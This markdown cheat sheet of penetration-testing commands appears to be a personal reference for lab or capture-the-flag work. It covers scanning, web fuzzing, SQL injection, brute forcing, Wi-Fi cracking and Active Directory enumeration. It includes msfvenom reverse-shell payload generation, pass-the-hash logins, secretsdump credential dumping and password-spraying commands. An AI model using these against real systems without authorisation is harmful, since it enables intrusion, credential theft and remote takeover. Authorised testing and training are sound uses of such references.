## **Commands Master Checklist**
*mentioned in brackets if windows utils*

### **Nmap**
| | |
|--|--|
| nmap -vv $ip   |    *# normal verbose scan*| 
| nmap -sX -T4 $ip | *# XMAS scan*| 
| nmap -sN $ip   |    *# Null scan*| 
| nmap -sC -T4 -sV -p- -Pn --min-rate=1000 --oN nmap.txt -oX nmap.xml $ip   |     *# Service detection, Timing 4, Script Scan, No ping scan - manually scan all ports, xml output for ```brutespray```*| 
---

### **Gobuster**
#### **dir**
- [ ] gobuster dir -u http://$ip/ -w wordlist.txt -v    &emsp;    *# normal verbose web application directory brute-forcing*
- [ ] gobuster dir -u http://$ip/ -w wordlist.txt -x php,html,js,txt -o gobuster.txt -t 40   &emsp;   *# add extensions at the end of file - php,html,js,txt, threading - 40*
#### **vhost**

### **dig**
| | |
|--|--|
|dig +short $URL  | *# IP(s) associated with a hostname (A records)*|
|dig +noall +answer {{example.com}}   |    *# detailed answer for a given domain (A records)*|
|dig +short {{example.com}} {{A|MX|TXT|CNAME|NS}}  |   *# Query a specific DNS record type associated with a given domain name*|
|dig {{example.com}} ANY       |      *# all types of records for a given domain name*|
|dig @{{8.8.8.8}} {{example.com}}  |   *# Specify an alternate DNS server to query*|
|dig -x {{8.8.8.8}}    |   *# Perform a reverse DNS lookup on an IP address (PTR record)*|
|dig +nssearch {{example.com}}  |   *# Find authoritative name servers for the zone and display SOA records*|
|dig +trace {{example.com}}     |   *# Perform iterative queries and display the entire trace path to resolve a domain name*|
- ##### **Zone transfer**
    - [ ] dig +short ns {{URL}}
    - [ ] dig axfr {{URL}} @{{SERVER_DOMAIN_NAME}}
---



### **Sqlmap**
| | |
|--|--|
| sqlmap -r packet.txt --threads=10 | *# starts sqli attack on the saved packet through burpsuite/dev tools* |
| sqlmap -r packet.txt--threads=10 --technique=B -p $TEST_PARAM --batch | *# checks for blind SQL injections techniques on the parameter with no user input and use the default options. TEST_PARAM can change according to the POST or GET parameters* |
| sqlmap -r packet.txt --threads=10 --risk=3| *# starts a SQLi attack with higher chances risk involved. default=1. max=3* |
| sqlmap -r packet.txt --threads=10 --level=5| *# increase level of tests to perform. default=1. max=5* |


### **Nikto**

### **Recon-ng**

### **dirsearch**

### **Wfuzz**
| | |
|--|--|
| wfuzz -u URL -b PHPSESSID=FUZZ -w $WORDLIST | *# to bruteforce PHPSESSIONIDs* |


### **ffuf**
| | |
|--|--|
| ffuf -w wordlist.txt:FUZZ -u http://\$ip:\$port/FUZZ | *# Directory Fuzzing* |
| ffuf -w wordlist.txt:FUZZ -u http://\$ip:\$port/indexFUZZ | *# Extension Fuzzing* |
| ffuf -w wordlist.txt:FUZZ -u http://\$ip:\$port/blog/FUZZ.php | *# Page Fuzzing* |
| ffuf -w wordlist.txt:FUZZ -u http://\$ip:\$port/FUZZ -recursion -recursion-depth 1 -e .php -v | *# Recursive Fuzzing* |
| ffuf -w wordlist.txt:FUZZ -u https://FUZZ.squid.com/ | *# sub-domain Fuzzing* |
| ffuf -w wordlist.txt:FUZZ -u http://\$URL:\$port/ -H 'Host: FUZZ.$URL' -fs xxx | *# VHost Fuzzing* |
| ffuf -w wordlist.txt:FUZZ -u http://\$URL:\$port/admin/admin.php?FUZZ=key -fs xxx | *# Parameter Fuzzing - GET* |
| ffuf -w wordlist.txt:FUZZ -u http://\$URL:\$port/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx | *# Parameter Fuzzing - POST* |
| ffuf -w ids.txt:FUZZ -u http://\$URL:\$port/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx | *# Value Fuzzing* |

### **smbclient**
| | |
|--|--|
| smbclient -L \\\\$IP | *# List of the shares of the remote SMB server* |
| smbclient \\\\\\\\\$IP\\\\\$SHARE_NAME | *# logs into the server for the smb share if there is no password authentication* |

### **enum4linux**
| | |
|--|--|
| enum4linux -v $IP | *# scans smb service in verbose* |
| enum4linux -a $IP | *# runs all options apart from dictionary based share name guessing* |
| enum4linux -U $IP | *# Lists usernames, if the server allows it (RestrictAnonymous = 0)* |
| enum4linux -u $USER -p $PASS -U $IP | *# Use credentials to pull a full list of users regardless of (RestrictAnonymous = 0)* |
| enum4linux -s $WORDLIST $IP | *# Performs dictionary attack on the samba server share names* |
| enum4linux -o $IP | *# scans OS information* |
| enum4linux -i $IP | *# Scans about printer information* |

### **wifite2**

### **aircrack-suite**
| | |
|--|--|
| aircrack-ng start wlan0 | *# Creates an interface named wlan0mon to be in monitor mode* |
| airodump-ng wlan0mon | *# Hops channel to channel to receive becons from 1 to 14 used for 802.11b and g* |
| airodump-ng -c 11 --bssid ${BSSID} -w dump wlan0mon | *# -c parameter is to tune the channel -w is to write network dumps to a disk file* |
| aircrack-ng -b ${BSSID} dump-01.cap | *# if you need enough IV (Initialization vectors) you can stop the dump and start to crack the file* |
| aireplay-ng --fakeauth 0 -e ${Network ESSID} -a ${BSSID} wlan0mon | *# Injection test* |
---

### **hash-calc**

### **hash-identifier**

### **sums**
| | |
|--|--|
|md5sum $file_name|  |
|sha256sum $file_name| |
|sha512sum $file_name| |
---
  
### **CertUtil (Windows)**

### **hydra**
| | |
|--|--|
| hydra -L $USERLIST -P $PASSLIST $IP $SERVICE | *# uses all the combinations of the users and the password to bruteforce the service* |
| hydra -l $USERNAME -p $PASS $IP $SERVICE | *# uses the given username and password combination to check for authentication* |
| hydra -L $USERLIST -P $PASSLIST -t 40 $DOMAIN http-post-form "/path_to_login:user_name=^USER*&password=^PASS^:F=$FAILURE_MSG"  | *# http-post-form brute-force using username and password wordlist* |
| | *# * |
| | *# * |

### **responder**

### **john**

### **hashcat**
| | |
|--|--|
| hashcat -a 0 -m 0 $hash.txt $wordlist | *# -a is for attack type -m for mode or hash type * |
| hashcat - examples documentation | https://hashcat.net/wiki/doku.php?id=example_hashes |

### **ophcrack**

### **crackmapexec**
| | |
|--|--|
| | |

### **cewl**

### **masscan**

### **Auto-recon**

### **binwalk**

### **steghide**
| | |
|--|--|
| steghide info $FILENAME | *# gives the informtaion of the filename if there is no passphrase else asks for passphrase* |
| steghide extract $FILENAME | *# extracts the embeded info if the passphrase is correct* |

### **stegseek**
| | |
|--|--|
| stegseek $FILENAME $WORDLIST | *# password bruteforce on the image. auto extracts if password found* |

### **bloodhound - active directory**
| | |
|--|--|
| neo4j console | *# to start the neo-4j graph database. requires root permissions* |
| bloodhound | *# Starts the bloodhound GUI console* |
| bloodhound-python -u $USER -p $PASS -ns $IP -d $DOMAIN_NAME -c All | *# enumerates the active directory and dumps all the info as JSON file which should be uploaded to the Bloodhound GUI console* |

### **amass**

### **sublist3r**
| | |
|--|--|
|sublist3r -d domain.com||
|sublist3r -d domain.com -e google,yahoo -t 5  |  *# "-e" flag and providing a list of search engines, specifying the number of threads to use (-t)*|
---

### **subfinder**

### **dnsenum**

### **dig**

### **nslookup (Windows)**

### **traceroute**

### **netdiscover**

### **fcrackzip**

### **aquatone**

### **evil-winrm**
| | |
|--|--|
| evil-winrm -i $IP -u $USER -p $PASSWORD | *# login with plain texted password* |
| evil-winrm -i $IP -u $USER -p $PASSWORD -S | *# login with plain texted password - SSL enabled* |
| evil-winrm -i $IP -u $USER -H $NTLM_HASH | *# login with NTLM hash - Pass the hash attack* |
| evil-winrm -i $IP -u $USER -p $PASS -l | *# Store logs* |


### **wpscan**
| | |
|--|--|
| - [ ] wpscan --url $URL --verbose   |    *# basic usage* |
| - [ ] wpscan --url $URL --stealthy   |   *# stealth scan* |
| - [ ] wpscan --url $URL --enumerate vp,u,vt,tt --follow-redirection --verbose --log target.log   |  *# enumerate vulnerable plugins, users, vulnerable themes, timthumbs and saves in the targer.log file*|
| - [ ] wpscan --url $URL --usernames usernames.txt --passwords passwords.txt threads 20   |  *# Execute a password guessing attack*|
| - [ ] wpscan --url $URL --enumerate vp --wp-content-dir $remote/path/to/wp-content       |          *# vulnerable plugins and specifying the path to the wp-content directory*|
| - [ ] wpscan --url $URL --api-token $token    |  *# Scan a WordPress website, collecting vulnerability data from the WPVulnDB*|
---

### **theharvester**

### **msf**
| | |
|--|--|
| https://www.revshells.com/ | *# insted of looking for payloads everytime use this to generate a reverse shell code* |
| use exploit/multi/handler; set PAYLOAD $payload; run | *# use msfvenom to generate an exploit, transfer it to the target machine and run this in the local machine to get the reverse shell* |
| msfvenom -p windows/shell/reverse_tcp LHOST=$IP LPORT=$PORT -f exe > revs.exe | *# generates a payload for windows and saves it in revs.exe file* |
| msfvenom -p windows/meterpreter/reverse_tcp LHOST=$IP LPORT=$PORT -f exe > revs.exe | *# generates a payload for windows (meterpreter shell) and saves it in revs.exe file* |
| msfvenom -p java/jsp_shell_reverse_tcp LHOST=$IP LPORT=$PORT -f war > shell.war | *# java payload* |
| | |

### **busybox - chatterbox**

### **Patator**

### **wifiphisher**

### **nuclei**

### **fierce**

### **ifconfig**

### **iwconfig**

### **proxychain**

### **beef-xss**

### **bash**
| | |
|--|--|
| for i in $(seq 1 1000); do echo $i >> ids.txt; done | *# create sequence wordlist* |
| curl http://$URL:$port/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded' | *# curl with POST method* |

### **socat**
| | |
|--|--|
| | |

### **ssh**
| | |
|--|--|
| ssh -L $LOCAL_PORT:$REMOTE_IP:$REMOTE_PORT $USER@$IP | *# port forwards remote port to local port via SSH* |
| ssh-keygen | *# creates a new key in the local dir* |

### **nc - netcat**
| | |
|--|--|
| | |
| nc -l -p 8001 -c "nc 127.0.0.1 8000" | *# listens to the local traffic on the port 8000 and exposes the traffic to the port 8001 - kind of tunnel* |

### **AutoRecon**
| | |
|--|--|
| autorecon $target_ip | |

### **Brutespray**
| | |
|--|--|
| brutespray -f $NMAP_SCAN_FILE -t 20 | *# simple bruteforce for all services with threads 20* |
| brutespray -f $NMAP_SCAN_FILE -s ftp | *# sprays on only the specified sevice* |
| brutespray -f $NMAP_SCAN_FILE -U $USERNAME_FILE -P $PASSWORD_FILE | *# custome username and password wordlist* |


### **SearchSploit**
| | |
|--|--|
| searchsploit $SERVICE_WITH_VERSION | *# Scans the expoit-db database for publically available exploits* |
| searchsploit -m $E-DB-EXPLOIT-NUMBER | *# mirrors the exploit to the local dir* |



### **Mount**
| | |
|--|--|
| sudo mount $ip:/$FOLDER_NAME ./$MOUNT_DIR | *# mounts the remote share in to specified dir of the local machine* |
| sudo umount $MOUNTED_LOCAL_DIR | *# unmounts the remoted mounted share from the local machine* |




### **Impacket**
| | |
|--|--|
| impacket-rpcdump -port 135 $IP \| grep -E 'MS-EFSRPC\|MS-RPRN\|MS-PAR' | *# scans the port 135 for rpc* |
| impacket-GetNPUsers -userfile $USERLIST -dc-ip $IP -dc-host $DOMAIN_NAME -outputfile $FILENAME $DOMAIN_NAME/ | *# Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their
TGTs for cracking* |
| impacket-secretsdump $DOMAIN_NAME/$USER:'$PASS'@$IP -just-dc | *# Performs various techniques to dump secrets from the remote machine without executing any agent there.* |
| | |
| | |


### **RPCclient**
| | |
|--|--|
| rpcclient -N -U "" -p $PORT $IP | *# Anonymous logon* |
| rpcclient -W WORKGROUP -U username $IP | *# uses workgroup* |
| rpcclient -k $IP | *# Kerberos authentication* |
| srvinfo | # Server info |
| enumdomains | *# Enumerate domains* |
| enumdomusers | *# Enumerate domain users* |
| enumdomgroups | *# Enumerate domain groups* |
| querydominfo | *# Domain info* |
| getusername | *# Current username* |

### **feroxbuster**
| | |
|--|--|
| feroxbuster -u $URL | *# runs feroxbuster in default mode - directory brute-forcing* |
| feroxbuster -u http://$IP -r --silent | *# allows redirects and silent output* |
| feroxbuster -u http://$IP -x php,txt | *# adds specified extension* |
| feroxbuster -u http://$IP --output results.txt -t 20 | *# outputs to the specified file with threads as 20* |
| feroxbuster -u http://$IP -w /usr/share/wordlists/dirb/common.txt | *# uses custom wordlist* |
| feroxbuster -u http://$IP -n | *# Disables recusion* |
| feroxbuster -u http://$IP -L 4 | *# sets recursion depth to 4* |
| feroxbuster -u http://$IP --force-recursion | *# Forces recusion* |
| feroxbuster -u http://$IP -q --filter-status 404 | *# Filter by status code* |
| feroxbuster -u http://$IP -q --status-codes 200,301 | *# allow this status codes* |
| feroxbuster -u http://$IP -A --burp | *# generates a random user-agent* |
| feroxbuster -u http://$IP --cookies PHPSESSID=t54ij15l5d51i2tc7j1k1tu4p4 --burp -q | *# adding cookies* |
| feroxbuster -u http://$IP -f | *# add a trailing slash* |
| feroxbuster --resume-from ferox-http_192_168_1_4-1723370176.state -q | *# resume from last state* |
| feroxbuster -u http://$IP  -r | *# follow redirects* |



### **tcpdump**
| | |
|--|--|
| tcpdump -i eth0 icmp | *# monitors the interface eth0 for icmp packet* |


### **MySQL**
| | |
|--|--|
| mysql -u \$USER -p '$PASS' -h \$REMOTE_IP -P $PORT -D $DB_NAME | *# Connect to a remote mysql server* |

### **wget**
| | |
|--|--|
|  wget --mirror --convert-links --adjust-extension --page-requisites --no-parent $WEBPAGE | *# Download a website recursively* |

### **GPG/PGP**
| | |
|--|--|
| gpg --import $FILENAME.asc | *# Imports the key* |
| gpg --output out.txt --decrypt $FILENAME.gpg | *# decrypts the file and saves the output to the file* |

### **xfreerdp**
| | |
|--|--|
| xfreerdp /u:$USERNAME /p:$PASSWORD /v:$IP | *# connects to the remote desktop protocol of the remote machine. Note that /v can be IP or HOSTNAME or DOMAIN NAME* |

### **nbtscan**
| | |
|--|--|
| nbtscan -v  $IP | *# NetBIOS enumeration with verbose results* |

### **awk**
| | |
|--|--|
| awk '{print $COLUMN_NO}' $FILENAME | *# print out a specific column from a file* |
| cat $FILENAME \| awk '{print $COLUMN_NO}' | *# similar to last one* |
| awk -F, '{print $COLUMN_NO}' $FILENAME | *# similar to the first one but with custom delimiter, in this case it is the ','* |

### **Empire**
| | |
|--|--|
| | |

### **finger-user-enum**
| | |
|--|--|
| https://raw.githubusercontent.com/pentestmonkey/finger-user-enum/refs/heads/master/finger-user-enum.pl | *# copy the source code to a local dir* |
| perl finger_user_enum.pl -U $USERLIST -t $IP | *# brute-forces the useranames for the finger service* |
| perl finger-user-enum.pl -u $USERNAME -t $IP | *# checks for the user in the finger service* |
| perl finger-user-enum.pl -U $USERLIST -T $IP_LIST | *# brute-forces the usernames on a list of hosts* |

### **finger - port 79**
| | |
|--|--|
| finger @IP | *# List users* |
| finger $USER@$IP | *# Get info of the user* |

### **rustscan**
| | |
|--|--|
| rustscan -a $IP -- {NMAP_ARGS} | *# default rustscan in which nmap arguments can be added* |
| rustscan -a $IP -r 0-65535 --ulimit 5000 -- -sC -sV -T4 -oN rustscan.txt -vv -Pn -oX rustscan.xml | *# all port scan with packet limit=5000 with other nmap arguments* |

### **od - dump files in octal and other formats**
| | |
|--|--|
| od -bc $FILENAME \| head | *# dumps the header of a file* |

### **git-tools**
| | |
|--|--|
| https://github.com/internetwache/GitTools/ | *# source to download all the .sh files* |
| bash gitdumper.sh $URL/.git/ $LOCAL_DIR  | *# downloads the .git from a webpage to the local dir* |
| bash gitextractor.sh $SOURCE_REPO_PATH $DUMP_PATH | *# tries to recover incomplete git repositories* |
| python3 gitfinder.py -i $INPUTFILE -o $OUTPUTFILE -t $THREADS | *# identifies websites with publicly accessible .git repositories. It checks if the .git/HEAD file contains refs/heads* |

### **identify**
| | |
|--|--|
| identify -verbose $IMAGE | *# describes the format and characteristics of one or more image files.* |

### **whatweb**
| | |
|--|--|
| whatweb -v $HOST | *# scans blogging platform, email addresses, CMS, account IDs and etc with verbose results* |
| whatweb -v -a 3 $HOST -t 40 --no-errors | *# aggressive scan with dont print errors in results* |

### **nohup**
| | |
|--|--|
| | |

### **onesixetyone - SNMP scanner**
| | |
|--|--|
| onesixetyone -c $WORDLIST $IP | *# bruteforces the SNMP credentials for the given host* |

### **snmpwalk - snmp enumeration**
| | |
|--|--|
| snmpwalk -c public -v2c $IP | *# -v is the version -c is the community wordlist file. This runs the default SNMP enumeration* |

### **snmpbulkwalk - snmp enumeration**
| | |
|--|--|

| snmpbulkwalk -v 2c -c public $IP . | *# -v is the version -c is the community wordlist file. This runs the default SNMP enumeration* |

### **Arjun - parameter discovery tool**
| | |
|--|--|
|arjun -u $IP -t 40 -w $WORDLIST | *# brute-forces the parameters using the custom wordlist provided* |

### **utmpdump**
| | |
|--|--|
| utmpdump $FILENAME | used to analyse the btmp, utmp and wtmp log files  |





### ****
### ****
### ****
### ****
### ****
### ****
### ****
### ****
### ****
